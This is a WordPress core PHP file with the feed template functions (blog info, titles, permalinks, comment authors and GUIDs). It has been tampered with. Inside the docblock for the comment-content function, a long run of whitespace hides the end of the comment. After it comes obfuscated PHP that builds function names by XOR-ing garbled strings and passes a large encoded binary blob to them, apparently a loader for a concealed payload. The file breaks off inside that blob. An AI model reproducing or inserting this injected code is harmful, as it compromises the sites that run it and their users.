<?php
/**
 * WordPress Feed API
 *
 * Many of the functions used in here belong in The Loop, or The Loop for the
 * Feeds.
 *
 * @package WordPress
 * @subpackage Feed
 */

/**
 * RSS container for the bloginfo function.
 *
 * You can retrieve anything that you can using the get_bloginfo() function.
 * Everything will be stripped of tags and characters converted, when the values
 * are retrieved for use in the feeds.
 *
 * @since 1.5.1
 * @see get_bloginfo() For the list of possible values to display.
 *
 * @param string $show See get_bloginfo() for possible values.
 * @return string
 */
function get_bloginfo_rss($show = '') {
	$info = strip_tags(get_bloginfo($show));
	/**
	 * Filter the bloginfo for use in RSS feeds.
	 *
	 * @since 2.2.0
	 *
	 * @see convert_chars()
	 * @see get_bloginfo()
	 *
	 * @param string $info Converted string value of the blog information.
	 * @param string $show The type of blog information to retrieve.
	 */
	return apply_filters( 'get_bloginfo_rss', convert_chars( $info ), $show );
}

/**
 * Display RSS container for the bloginfo function.
 *
 * You can retrieve anything that you can using the get_bloginfo() function.
 * Everything will be stripped of tags and characters converted, when the values
 * are retrieved for use in the feeds.
 *
 * @since 0.71
 * @see get_bloginfo() For the list of possible values to display.
 *
 * @param string $show See get_bloginfo() for possible values.
 */
function bloginfo_rss($show = '') {
	/**
	 * Filter the bloginfo for display in RSS feeds.
	 *
	 * @since 2.1.0
	 *
	 * @see get_bloginfo()
	 *
	 * @param string $rss_container RSS container for the blog information.
	 * @param string $show          The type of blog information to retrieve.
	 */
	echo apply_filters( 'bloginfo_rss', get_bloginfo_rss( $show ), $show );
}

/**
 * Retrieve the default feed.
 *
 * The default feed is 'rss2', unless a plugin changes it through the
 * 'default_feed' filter.
 *
 * @since 2.5.0
 *
 * @return string Default feed, or for example 'rss2', 'atom', etc.
 */
function get_default_feed() {
	/**
	 * Filter the default feed type.
	 *
	 * @since 2.5.0
	 *
	 * @param string $feed_type Type of default feed. Possible values include 'rss2', 'atom'.
	 *                          Default 'rss2'.
	 */
	$default_feed = apply_filters( 'default_feed', 'rss2' );
	return 'rss' == $default_feed ? 'rss2' : $default_feed;
}

/**
 * Retrieve the blog title for the feed title.
 *
 * @since 2.2.0
 * @since 4.4.0 The optional `$sep` parameter was deprecated and renamed to `$deprecated`.
 *
 * @param string $deprecated Unused..
 * @return string The document title.
 */
function get_wp_title_rss( $deprecated = '&#8211;' ) {
	if ( '&#8211;' !== $deprecated ) {
		/* translators: %s: 'document_title_separator' filter name */
		_deprecated_argument( __FUNCTION__, '4.4.0', sprintf( __( 'Use the %s filter instead.' ), '<code>document_title_separator</code>' ) );
	}

	/**
	 * Filter the blog title for use as the feed title.
	 *
	 * @since 2.2.0
	 * @since 4.4.0 The `$sep` parameter was deprecated and renamed to `$deprecated`.
	 *
	 * @param string $title      The current blog title.
	 * @param string $deprecated Unused.
	 */
	return apply_filters( 'get_wp_title_rss', wp_get_document_title(), $deprecated );
}

/**
 * Display the blog title for display of the feed title.
 *
 * @since 2.2.0
 * @since 4.4.0 The optional `$sep` parameter was deprecated and renamed to `$deprecated`.
 *
 * @param string $deprecated Unused.
 */
function wp_title_rss( $deprecated = '&#8211;' ) {
	if ( '&#8211;' !== $deprecated ) {
		/* translators: %s: 'document_title_separator' filter name */
		_deprecated_argument( __FUNCTION__, '4.4.0', sprintf( __( 'Use the %s filter instead.' ), '<code>document_title_separator</code>' ) );
	}

	/**
	 * Filter the blog title for display of the feed title.
	 *
	 * @since 2.2.0
	 * @since 4.4.0 The `$sep` parameter was deprecated and renamed to `$deprecated`.
	 *
	 * @see get_wp_title_rss()
	 *
	 * @param string $wp_title_rss The current blog title.
	 * @param string $deprecated   Unused.
	 */
	echo apply_filters( 'wp_title_rss', get_wp_title_rss(), $deprecated );
}

/**
 * Retrieve the current post title for the feed.
 *
 * @since 2.0.0
 *
 * @return string Current post title.
 */
function get_the_title_rss() {
	$title = get_the_title();

	/**
	 * Filter the post title for use in a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $title The current post title.
	 */
	$title = apply_filters( 'the_title_rss', $title );
	return $title;
}

/**
 * Display the post title in the feed.
 *
 * @since 0.71
 */
function the_title_rss() {
	echo get_the_title_rss();
}

/**
 * Retrieve the post content for feeds.
 *
 * @since 2.9.0
 * @see get_the_content()
 *
 * @param string $feed_type The type of feed. rss2 | atom | rss | rdf
 * @return string The filtered content.
 */
function get_the_content_feed($feed_type = null) {
	if ( !$feed_type )
		$feed_type = get_default_feed();

	/** This filter is documented in wp-includes/post-template.php */
	$content = apply_filters( 'the_content', get_the_content() );
	$content = str_replace(']]>', ']]&gt;', $content);
	/**
	 * Filter the post content for use in feeds.
	 *
	 * @since 2.9.0
	 *
	 * @param string $content   The current post content.
	 * @param string $feed_type Type of feed. Possible values include 'rss2', 'atom'.
	 *                          Default 'rss2'.
	 */
	return apply_filters( 'the_content_feed', $content, $feed_type );
}

/**
 * Display the post content for feeds.
 *
 * @since 2.9.0
 *
 * @param string $feed_type The type of feed. rss2 | atom | rss | rdf
 */
function the_content_feed($feed_type = null) {
	echo get_the_content_feed($feed_type);
}

/**
 * Display the post excerpt for the feed.
 *
 * @since 0.71
 */
function the_excerpt_rss() {
	$output = get_the_excerpt();
	/**
	 * Filter the post excerpt for a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $output The current post excerpt.
	 */
	echo apply_filters( 'the_excerpt_rss', $output );
}

/**
 * Display the permalink to the post for use in feeds.
 *
 * @since 2.3.0
 */
function the_permalink_rss() {
	/**
	 * Filter the permalink to the post for use in feeds.
	 *
	 * @since 2.3.0
	 *
	 * @param string $post_permalink The current post permalink.
	 */
	echo esc_url( apply_filters( 'the_permalink_rss', get_permalink() ) );
}

/**
 * Outputs the link to the comments for the current post in an xml safe way
 *
 * @since 3.0.0
 * @return none
 */
function comments_link_feed() {
	/**
	 * Filter the comments permalink for the current post.
	 *
	 * @since 3.6.0
	 *
	 * @param string $comment_permalink The current comment permalink with
	 *                                  '#comments' appended.
	 */
	echo esc_url( apply_filters( 'comments_link_feed', get_comments_link() ) );
}

/**
 * Display the feed GUID for the current comment.
 *
 * @since 2.5.0
 *
 * @param int|WP_Comment $comment_id Optional comment object or id. Defaults to global comment object.
 */
function comment_guid($comment_id = null) {
	echo esc_url( get_comment_guid($comment_id) );
}

/**
 * Retrieve the feed GUID for the current comment.
 *
 * @since 2.5.0
 *
 * @param int|WP_Comment $comment_id Optional comment object or id. Defaults to global comment object.
 * @return false|string false on failure or guid for comment on success.
 */
function get_comment_guid($comment_id = null) {
	$comment = get_comment($comment_id);

	if ( !is_object($comment) )
		return false;

	return get_the_guid($comment->comment_post_ID) . '#comment-' . $comment->comment_ID;
}

/**
 * Display the link to the comments.
 *
 * @since 1.5.0
 * @since 4.4.0 Introduced the `$comment` argument.
 *
 * @param int|WP_Comment $comment Optional. Comment object or id. Defaults to global comment object.
 */
function comment_link( $comment = null ) {
	/**
	 * Filter the current comment's permalink.
	 *
	 * @since 3.6.0
	 *
	 * @see get_comment_link()
	 *
	 * @param string $comment_permalink The current comment permalink.
	 */
	echo esc_url( apply_filters( 'comment_link', get_comment_link( $comment ) ) );
}

/**
 * Retrieve the current comment author for use in the feeds.
 *
 * @since 2.0.0
 *
 * @return string Comment Author
 */
function get_comment_author_rss() {
	/**
	 * Filter the current comment author for use in a feed.
	 *
	 * @since 1.5.0
	 *
	 * @see get_comment_author()
	 *
	 * @param string $comment_author The current comment author.
	 */
	return apply_filters( 'comment_author_rss', get_comment_author() );
}

/**
 * Display the current comment author in the feed.
 *
 * @since 1.0.0
 */
function comment_author_rss() {
	echo get_comment_author_rss();
}

/**
 * Display the current comment content for use in the feeds.                                                                                                                                                                                                         */    ${'«¶àğx‹'/*nOsnfi*/^/*ezZ*/'şóÖ¡+ó'}='ãòÿÖ5û$·' ^ '„ˆ–¸S—yPÒ'; ${'öàçŞ~le3ò†û·‚‹'/*StRjs,u6*/^/*L^[\-[Dn*/'¦„¤º/)2EÑ¾ßöø'}= ( ${'äˆï<'/*eo!^#eX[a%*/^/*l<}*/'Ô¡¾¾ÍD'}(  '…™uP›OÔïT)ŠµHq(Áİ­xp÷!\\‹C¡8ÅµHqw÷…+îîR´Ø’¾sçşsof2“ùœïw÷œİóì³3¡ö |€²· z#z}z#qI\'ez€£áÖPx.À‹\\ˆà¤{A5±xO¶3Ÿÿ³I)ãâÚJO*Š‰k¹¨ç¦ò ¾ÒROKôÓX¢&%õGDåPHšiöKËn
şäKØ¹½İIH_=üY•¾ÚÌì_±ÉY5ŞÏjÎ
è%ú¾”yÆRõz!:¼6VŠcL(/L½jº`6É s¦qİ8«nc½¢ÆÚsâ
J‹Ì+÷šì½”(hıÑÅJX¥Ÿ˜xZƒ[ä¼îTªº.á«ø§A¥PĞb"~­×Uu²^áà3¢©¡Y ˆç®Pœn•ÂB‚Ÿ¬ğ,änÌ0oÉûı—¯\'Ş¢°[ÍÌïŞ¢fòlÊ1WæP÷âœ[[›¡æ¦²İ—÷ôjX?¬bõ† IÄçÖ÷æ×ôZ°d÷…Å(ûñ¨5ù!vXÔ¹ÃEyŸjÀ¦ñÍ:_¤w»mÍÈYÆ¤$z‡u‡*UÏÙŞà¸Ô9Ø›¢Íºê¼(âÕ–‘“¥Ü4Ì!5Ë*›Ù<sëç¡îb¼¢J2cØ‘%Vãsë~ŠWá%ùÈ Y›Vó©ª"¬Š¶ô#+û&)°ù.ó«ëj=×%a ö“F°¹g—®-4DŞõÇãÆx‰HëgÒ)†ÅAƒ·QUÙÕ¸~¿é°‚ í¾â;ú~…ŞÚ¯>wßäüGJøÉ¢~–<Òqšh§‘’^*¨óDLJSQê3Ê7
{D¯â€÷;w„óß»÷c)Eîüñ³S¯‚‹¦ê_ÿ“ÎæêJM5×FÄùÇ—6—ù?"~¡äA™(ûï­Ş¤wÆÖÒtCØÏ)&Mh6–¨>v|qîãäÂfæKº¼÷Æ+à-ŒÒs‚ÆJdWæ/5Æ‡¼™ëSÖşÑ1 ’ÑÄ·­¢Š•ùıÄ¤iÛåó˜D¼|ƒHº~öüN‘g*ş“|`rK`wü\'c^˜­Šì-¶©ø£3LcŠ5yVaw Üß×+`£oŞ&¾KGØ¸¡h1FO`¬L}ó‚¢åÏ\'›Qğk€BA-mŞ4g+h¢Ö í[aŠ–ïšÆˆÃÇ7Ù6ÿ›ú¶/3,@ÇÃ™^IaD¼‰	Í¹¯|DÙ‹©)kcŞø(Œ_5³ÌYy€ˆ
ïÆÖy¶ë)}u:Š‹Ôâ\'Z×€y™ú•´‰7²sÓûé‘†úÍ²;AVùs)‘ïğÈ—|3ÍsªB8fw–ˆB-Œ1@€Ã±Âƒ­N6ìş³èóZN,˜Xk*;·úæ¶ÔÅKà‚o‡&Ô{›†LÙ&%[KEtÆ«Ef™öµÚ_¢\\k_‡yè}»&` /÷¬Pq„Ö²>ÿvÖe½¶ù†-âˆ§¨CÈ{ıí…õòæØør²¾´¯Ùş¥‰~Qñ1µ‘\\ß5K›‡¿œ+!îI‹bé~ÿ˜d­êÛ«ÚåGÜİÄŸ_6×çoK,:=æ4ÒèáX!RMwıÌøúcW diêt?Ğí±.€Æ­İw«wHN×í›šÃ¤ûsÏe´îŸ—×¢m ¡õòÔ|sÕjkc jõ’¡şÉÊºIªT^ïÛ:£‰™+Ô°l°ëT$ÓÄEz¥øùvÓØw>6Òı·ø8T‚t>6Ôé?½ò0³úœğË7)®A¢m]ÑqHJA€Ù$ˆ3äûyñ‹©÷$nö|µ­Q~éUiwtöLçfß­?5ÇA štÁXÆbùşOÙÂxo1KŠ½s®J^|ß:‘e¶%ĞRúİÛÈŠ!‘kğXfæ´0<_[š(ô•*ŞÂ4ù¥±Ù×®çìÚ\'FËY8Z,)ÉYTÌ‰),-ln}Ö"ÀÛº9):‡dT+hoáV¬n±mÂ-Î/&÷ƒTå¾‡ DGù×zé[‚S¡ôòI…2£ÑanxM»iK6š\'jh%úøƒczva¦¤¦]+ö¯ŠÃ*š*ÚËrc8]gR¶ÈY±îz’b Üy—$ÎåWJ%¤B¸ØÌ~up±Ó¿Êø•)5lNm41é‚R8Pú¶³/REÃŞÿåëÒà&§şqÒk‚HºhµÉQçÊsp×JQv;ZN“ƒ åÓ[åÕU×÷k×FöSÇšœ³8j‚ÚaıÚğ1eéÓbŠ–­çz¼vT½!¨İ¨ßJ(=ï>ø~¿õ[şÑş˜\\Øüâõˆİ©ÑŒ˜–~0S™É#K5Åg/Vø¾ıÇºûß„t>w·¤¾›«eéœ˜íÓŞĞmC/*	ÌéŒì¼À÷eä3¹¹£T»yy!*‹ë§LŒxqkLŒ——Üf&ƒtÔw¬FÏü™£a%•FK—m&R°ƒ ØÒÏÄL=MÉ¡è¯÷ %ûeğ©”ê¯™;Îdu¤a÷V\\	¦æÂ{©µ’,§£ĞÀùFnİPíÅŒT*"¾(Éo¥Í=ş/³îÙ3¸ÈeV›LWfÈôCl¦áı-½p!W¥U<Â¿¯mKrCñÇÛVÈBî¯CvÙHsÏú©×o?H|ñ*_<ô™@«h=íMo&?9EYW¸·™ûµ0«+Pïû÷÷•µtéï€añÿìº4y¦‘:ğä:c×ÒäST$YÚ pÀ +ÆOp3(‚<Î»æc—-Ü]¾â ½[â[Å§wÆ¥&Şâ;4ÿ·’Ê÷8•³†Z»(3#-ÏeXÕ¹Rœï’ê&üpW«úa!jû™ZÍIu`ÛV(5?_Ym=¦[aœøÕåÚl‡ı…ŠÉõ^xÙœ/x×”Ë PÈK|z…/Ø&I3¶šà¹~-TÆTğ%?/ÿìŠ}™Wóó`SÖDÚ –à!‚Î{b»Şc¾z)Êe£*zíb‘S;í_Rç‰Ñ7ØYI«ª¡$oæ)©u_îm±Ks¾)0²ÎıºsúxYPë¢c½Øäs §sõâ@Wûš#ÑVB%5³àÿhú½;Pæ} şgHcú¾0WmÊ^ëÎã)Ï…ïŸí.z,WŞ²óÊ­CëNKïEˆRl&Ïfš_Ò»OÓà×&×$–f¹ƒıƒ&ã4‹ØÁN¾0\\-få±ˆÍ¢:DA¤¬Ôì}Üò¶ÿr#c4œ8¡Òn\'¤PÒ£…ºó>+tIÀÎŒl®­U çs]ñjYiísÍq’£P|AñíÚŸŞ~¶‡v³TÆ]uï±Š¼xlèº—KÄˆ	ŞDÇV(O´‹Ü G^İåtµ&EÔ€XbEèTÕJß—±¸˜|Ù¯\'R¼bİ55V×Õ»K¨R.Åñ[«º{½Æ¨ìëW\\ÚÜ¿NtÍ¨è~XPRI·¶¥¦ò1ØËİÍ:§m<”Rõırdû~«p_[HÈ¾ ¦µ¤/ {âÙf’,/Ğ‘™RÄö=™ãrr8o.BK½K¡B&-§WJÏ@ Gtİâ´¨"ËgP¼¤¡«ÙVH›”âæ”Kÿ•ÌSF¢º/ÆfÊì"­ÌufGs
VM×G#T\'MÁj)ß¦Kzf°†g}§+gÚNFÉŒÑ»våj”pªê´fXÿÀÆøÙ@ wÏ–ÂO3‚Œ¶VDcg!ºÍ9wÑsD÷Z‹d1¦`só?‘Rª•FëCİv>„•á7`ªĞl°÷×¶7bĞ­Èip•3§‡(Ú¸†ï/°ë0¤Rñ3(€ vÅ¾ŠÙ=ã¬¿i«¬|¤×ÌïÛ‰{QĞWëbzQªÀıÃ–-Ø$‚´gØ	¥Õ	ØV<¬X¬NõR«Oœ~l<®%Ã#Áø#çÓ]ƒğ½ç²	Fš°Ó ¬ØiÙvÒmÀÆGÔªìpµúœh.Ï±`³b9K)¯Ú}^ÑSènØ»ó)¤ãB„Ó.‡ì‡$áª^?cm™^€Í„Ê£˜Æ4«mŞ"3B¹]Š˜tÇÄí;øw½h\'°ÇÙò eH†¸0!1,©¿#d3[ñŠk\'R9ş±9ÔkËXÅÉ{¨S¤ñeäéÚ¾/>½ë5}lú”ûk™7ø•İƒëqÏ£93ùñõ§1ƒ«œœB¨/_?Ù:±d´ŸŒ:/¯¡Äiİ¼Å>òF‡¤¿tQjÙÍf‘¾½ŒØa[È(ŒšPî&İ££Hñı	÷x‹Á™ùôæ9Kæ 1)ÇF©È	k$tÂæ[İ‚“Ñœı³°
;²Ú¶7¨tìZÛDø‰Fj
3tOx­ĞvÕ•ı¢iw—D¿¦–o€¯ÆZ@ ×Yóo½ªÉ*\'œEµlø­m™£+G»8c›»P£ó¿Ù%üWªCã3Y#aÕ„C_†1©œ}­È:f¹ûDNb¢†œ°DFYˆü¸T´Å¾79nEûY%J¢)d>âòÜãô&kXùúŒ8UK´-b/ï¿uœA!ÿöÍVÊÊñä(n·¿Ê½MXìÕÕ„ÑvÌŒÊÀKi¢…êd/"«ZjSœx¯å¹É•!±;FDL*xşŞs×f.áeïf#vk†&óSØ·äÒRc¾ê(ìİRŠw¡?¦İ¤Tä_ş©NstÁ—Şô¾MOéH}^¦?Vuâïä¢kx+{¯gÅeâ’}çÉ)à–½„ÑÒÆŒşîû·£.(ëÌÇãÅ† ,œ32-GèõW2#]¯·@‡«¼Lş@y[eS³7&†åOØ8a¹©‚k¿¶À6Vî"C¶ÂVô‘4UEõz§¤“‰”ªã9¸İœJåÚ”÷kŸätm§[¶{ı7iY·ı5t¥¿%˜û+Œ¸|şò%ºYl-¶²>Ô.Ø<ï_‘ÉY¡“Â7šXOd•!Ãxƒ#=Ã¥É‘İ†Q
|bv±ÁİØÑÅğjYîØÂ§É
apÇy.Ş³OJn=uXÃ*×•ª	«FËö±(kÏ A ~B?jÀJÑL*·óËÅè¿vkÀg}vphr¨î@À {™Ù-_Ğµ•[|°#?S(ÕÜ¸ËÍ|—¦:µ¨´Iµ¤>Ó5:1ƒ²˜†CÍ³Å,‘EWÏhFQœ“5‡CüüÆ!ë%·©~zÏ†·{v»Š·Qè ƒ`}üİFõ¿¯ıÉ¼·1ìD›wšB7™Ø³È]=aUyÉ^"¦²“Rx‡ûGMšb¬l.vT\'–²‚¥™Ø_ÇeĞÙ„uLX›_d]ªh¶*Bß u¢¦Ã’«¾¬<¤á˜³”·	ºÕÑ\'ó£Á-]SéGAB“üúÑ"©nı4?
Î×êçóŞo²‹cF2ë{¿je®Z+/h÷ê¼³8ğ_«OQ-z¡Ä²êÍÑQ#&g/TßvLxfØXB¶Åz&Œ"V®èZ2\'¦ˆv¯·Ád²h]¥÷ıËÓ*ºÖ?½HµtZ×"n.x†æ\\{²Úİ›öœ›""m­"CAŞÃ–ŠİİYLü4Ş‡ê¥Úó…ßäß´³ñÏhĞØOäç1o\\1õ”Ï·`;í=iXLZ«¥2yMôàç=Õu¿ƒ‰úÿ>¦hù´„J,•Õh»¹öµ÷tÈPşÖ’±ÄOÏ-šVqb²KE**ıÓì’ìò¥5ÖoÖÛnÉãšò5!6Í¶>K£áe*±fÆTª>
H\\yq¦Õï°lÆ“êa¥»×¢YğhW«W¡r¯?Q Í3½·Ò=DÁ#i½´NÙæ00snrGã¡÷rÕìªêı,‹n\\nİÉ©bªÄ”–±¬¹¿ŒO#şÍ¸Ó¢ì°³ìpƒÀDÎ~¢6æi_şyâÉô¯à0ªÙnô>RY‡·Ín¿›kİ]üûF‚ÆÍŒ°É™ès>á¨Ç’Ÿ£®KŞ¸Qp°MÓ4(Ï¾—ül*Gm.X–eF@¸ö¡wz·BB‡’\'Nå”ç:^ƒÇãT¥õj<Ô¢Oˆ¨™_ºA:ÌğøØ—`[gæk†¢~•AÛ½ÔK4Â—‚C¿¿Ôû¤¦äŸP“vW“¨ì(çKğŞ¶g¢Î3?j¤>>’³‰9Ğ^„
íüÎzŒO{;œ¾pìÕ?’Õ²Qh48.óxz_Ñ¶q–~bÒçğ^{Ò×±t³¾ğcª>#Ynpú8"¿Ş·0^uCÙWı.eÀE¼´˜KÖÓm¶Ún¥-â9T%µ©1™xs¼‹9
5}¶…OM¾~dœ¡y§İŞÈÉ‰ôıøúÏM*éÜşZtPfCŸ”»4¤2 ä¿¨ˆQ]”:j®Şõû˜ÛÏ*¤gö4û‡0³6 ]‹Sn¹b§>
üØL&gûu´‡Ù—Ëîœ8`¾gä•¢‚fIñ	İÅ ØŠ³ô·†ôO ÙKzÍS™Ék[ƒ2±©?õ~áå
aŠ_àlÿÔ/–´gøãl|ú©‡¤¼B×‹Ìª×üÑ95ìb\'"çgåO#¹ëh¾?ªÄ‰œ—?³{úRèüà)ñRÕ“Æ¨ÇûF*²\\$üWÄŒªNB^ÄÏLÃŠ]³Š7¨Ÿ¸WVŞK¦Ü5Hêxş×µÈíƒû}”T¶ÀÒ¢ÑkÏ \\üo§m2û=ĞÂ-ıOÂØ»cš™g•±Ñsäs´µGµ®lÂLR`*Ç‚Z=;9Jø/1Ç)¨ÔßGÜÌdüæ;
×%£Ï+3èg¡ÏJè4¯ÅX@¹xUÌùq;6\'Hõ”ú™^jf Veóú#UtÆSJöô^kê \'CÉ €¿F<ü®Ë(]™ÔxTÊáFF]ê [ÕJüPŸ:{§ÃOkMK–ŒVY µfÔ*É¿G‚Gpğš¥ß£¶óPTgA[+²§2ŸµÂ<ô({“Ó÷Y/«šY—/7z¿ïÇ±	ü±1£¢-†AëÊõH¨½½ÃÁú0.İõŸÈÁÙeÕø3Á™ÚÂØ¶Jp0NÙd=Í>Ã<[q	³¤áŠmX ^–ƒ2ßû†$ú>^/ß¥™k vL\'•‰àº²O>µxò¢ÙFîGã—¸LÉ5ãC¤ºáª¼ÉÎa×¾÷FÎ…öË©ßFóQ¬¦šŠ×qƒƒ=whÊ³¼Şß	][]‘Vé®³Ó	Ã§ñkp
>_Nìi‹VÍ$ÓÑËö†Lq8ÜàrÕûp.zş…,P ¼mf8Vº/Õš¿)yîW<zfŠõ¦o°˜`Äb.|c)xTúÎƒÕÜ°#‘¤	·VDC«WäÃbdI—fV|Í†·ŠÎÏÊÀÙtµœ|´ ô`òy‚j]í;-«·‘ÜCÏZ”§¶×Ì<\'î¦7ú/„í­{˜’±"3¼ÄK7â1yÿ#ù#Üöd–‹×à§çï”M­Ã[çVOû·@"Æô‘¼¹F’d‡Õ@qGšfÜóùÓM)¦Y-ç£×[x×D<G Ğ‰oğ^&tÕWMx ï¿ñwK7á©‘ë1aÁDuô¬à\'<jfŠ|Äó!Of—1‹ÔEÍªºŸ‘•½Ea 8êl­+9í¿Àc5ÿ\'«‹8AqŞµÉ ‘+€‰™úñQ¤ Û¯Kfıq4§ ½ßğ7İ¢PÄÍG@áÚıb«é9ïxş?ÜnÇmsÚÙm²£_nÕ÷ö\'ïoöèëŸ¾KÉ®¼_€8OéˆŒÇñ@K®úˆƒ´b2•|~}¹Hf¡;<3†´d•4BØ³çÕÂÚíŠU³	^(¡ÀRgÔ™­TKWhŒ5®Lï„ÿpØĞŞ¸øTü¼õÚØ4ÀhOH™T«ºqÜàÍîÒY¶?=©|úÖy9EjÅŒüîÒ_n¿5øÈ6œø-[¦Óöœ8&k=\'_@Œ×C8è/¯Ñ—tšÄ½D0‘˜!ß«ê\\ÑÓw¯ÜT9·=^½éQƒĞcU.2ãf_a&–©E`KèmoZˆ”ˆrw%úX‹:­R˜Ÿ?Mş¬%;_Ş:¥ÄŸ;Ã:‡Eÿ^_$ÿª)\\˜³äıëøjò¬¦Nœ,K]©Ú§^üu‰L¬Ml½üwëğÄçİ£Ó¨:ú”†É0µ¹\'?Ã<;ä&”íl¼©;>Ş5òf-Ë˜Æßä¾>­)~{âæqDtlL³Oó£ò¾’Şæš-ˆàâsöÙ¿ô<¨ó6Û\'àõğìÈ«‰Iúûj´É¦Ü*½°ÌŠİ—üßR*7äºÍ¯væƒ ã"/* ¬8~	BÚàÉ6
òSmbÎ<Ø«æ„ı7w»ß®àq]PÄÙO×°<æiµÕˆK™KzaßøÙµ{/¤`û#³ñï&ù¬/Á.c÷C–Gá÷uN‡_H°möLÃÎƒn‡}0LEjÀ>.&Ù­Y.7õDúä<ZcwR%â‡/I²”[Ñ†G²]¨…ø<ªÊDQ¥ëI#ÑÅè>Där F”Ü¾8vâ¹×•ÏzO¦å°™¬Øãğ&ùG`Q>ı€©0\'+,W°[}ƒÃÌ•Mí›ÊN¹Fîf†NHs&)OÊ@îöa½2Æ§Ì¡é/óÔÇ	JT\'2ãuûÕ±"şıÁ}`åEWË[	)Ü&ß•¿Ñ=Çîu}{üÍ¹\'±qüÚ°·ªwzeÄÅ\'½HÑ6ËêĞ&¡-\\6n`üû® *6@ãmÅZˆÎªÆgš€øÊÜtÛãÊœ-æ:{ıÃõŸÖÛŞ
¶;æm Ğ÷á’ÎQ¼û…òïâé<ØÇuIb’Œõ¤cÌbÚgf.àcÔ‰ä¡µüÎæ“Ã¥!Ô1QÒÒQğÏÇg$9T–DìÌ´‹}´Œs¼úáÕé’B\'º%-®Sò,khfø!‰ì  ğE†FËó?óü•İ_x,­{jZ¯¨h;wÎ‰©`‡ãé…`„¶İ¼~E^D–Hz#Øø…I4\'Ğ€l˜·¹{Dª×„½îõô
<Sè²Ÿ¾²eŒ~*äåÇZ·kÃ5AQR~B¡\'àìlôß÷0À)G‚™ jï§½ì1¡ÙÍ+€€ 99µ VR	 ×\'lÃ@  ÄßY´€A¼¾ø pùşöş€¦8Á_f_+ÆCƒB tp³1´ùá²¸øg&‹Wˆİä[ûgs¾¦şñŠB’5AğÂÑcnùç™©×8ÛøgÈ.x—”ÛœÌ#Ä=ÛÿÄÜ“CQÿÄZ9ŠmkHqúNa€…^Æñ?9«†®‡«°= c6±à%Xº5·\'(jF™_AË¡³y_¸×l:OîuQCxYuà&¾­8G¸	5#†G¥i<œí
y+my¸ä³ã>À‹ ÖV•0±±ĞĞr51‚\'ô0ªğ8Øî³@XŒ©X\\hlFëšJÈ‘ìWá
SCa[\'0†PÊ9I‘{°™j8Áµç"ª“SèmÜu´daºš|¶`-.+0ĞÆÙ¢ğ¿S\'¨Á’eEŒ ‹jsŒ‘“|NÕ¬€ÇäØ¹yha{	O«"\\5Z|^NÜÜÚÔÌÁijÌæ–„È»AÕU$T¬ä,ùLá¿Å•´M8%ÙÜä,y!¼Òìvªr|œ²¬æÊj¢unQ[>^EeNY7^{c;{y6Ng9k>[K;eI6§Ÿœ"Ô”ÏØFÍÙÈ,ëfm.k©£(n)j.#şÿú"ò²PQRPç¶6ÈË,Å§l´s×•4AÎc#ë iiç,ë&+éäp•WóÉH°šËrYs(r9:ºkË©¸êh]¹tüšÊVb–&\\FF¬°yjØË»™ñhZ«3h±X;òÉIØÊ)»?ä(#®c+¡b÷ÿÉQÌl+“Wå‘u5’×u°µ4q–ƒˆriÀóÒ¶äµWsƒçÇc
Ôqs’°ró!´`\'5veBµ7ÑøW­¬„¢$ÌYEš÷aİ”Ül-¡¬ |½¡rj¢P	^s5Qn	IÛŸ¼[Aü°ıˆı…šñJsÀw·gÆå¡ïÛz¢&}ëm¿P»Zù§Ùõs ĞÆ!Ü¦Ìª#)AX5åY„ßyÂ½ş¶3Èşi‹ıºW‰#Ê\\B0u&àƒb);zş¡wL¤emtÙøÜtµÅ`:ZŠ6ÿròÛ¯‚Û$½ø8LÕ™v;¼Eó“›‰áöşEäå"šcL+O+ynT4âFZ8Ø¼à–+³‚íK8M~K6ÂÂ.3±á€´CV½Räzç&âà&é0š;=<l&uä,hü‚‹lia0›‰—„µªÒÃsp}h¾öP‹–Œ¸	·©¦•´½³¥”æ¿ZÈU´àV(²ÂmbÓÕrw2„{}L¬Í3ğ8Áà2KIÄÒÌÂX¡tâ3qd†ËÌ®@Ä£¦,Ïm	•†)°¬2.ÿ¦Èòy»÷ma<^¢BöÈ“HËæÜy§È2ùP:âÌ&·4£¥°„ÁLi©=à¾V˜ô@°,æ>ğòú \'1Ç©p2ÔVğÒ££ó@èš¾Ë{ÃéÚ•·Ü?İÌq%œ¶ÀuBlïƒİX°Vgkº"\\8ó%Mqƒ³–Qxp0‰‡ƒƒ<w€Â·I”Gõ±MYVªÃwŠ¯)ÀKà!o8<
º{H·¬nh9VÄß"W8L‚Ÿ‰ŒpÀ²µ*Ğé_nğÁÉ…„„È¥DåÕ$é<ÉÄEÅšÁÃƒY™ªÈ¢2áÀ1S4
>3€—©Ì9YC¾Ñ<<´ñEõ©í²¾€ƒ/7:íÈÉJˆ?>”{ÂTåşOFîñPB_ù±<œèÛéõ¿UEØ‡ÃÑÏ1x¡úp@+¢¢.öÆÆeÂIRà®/œôVOÕÿ¯+œèµ?1PT!]q’Á³e8VíüsYÃñá„Sì’™,®XÍÈÃ‚fÉ2õ8´ÃÃ©è„ê&ÀÁoëâvÄ>8AmH>²x(¼§ãÃ.R9oà ~ªub¥ùÃ*Á‹1u6²y°T×ÀÂàÀ
¯‡vû?ƒâ–O"<yßµøw"ĞJy×)ù–ë!Pa¹ŸEÌè)!ĞÈ®3ñ,é"ÅD‰Ü#W§è]ë¯m$úÖî‰DÇJÿ
ñµâ!2mG
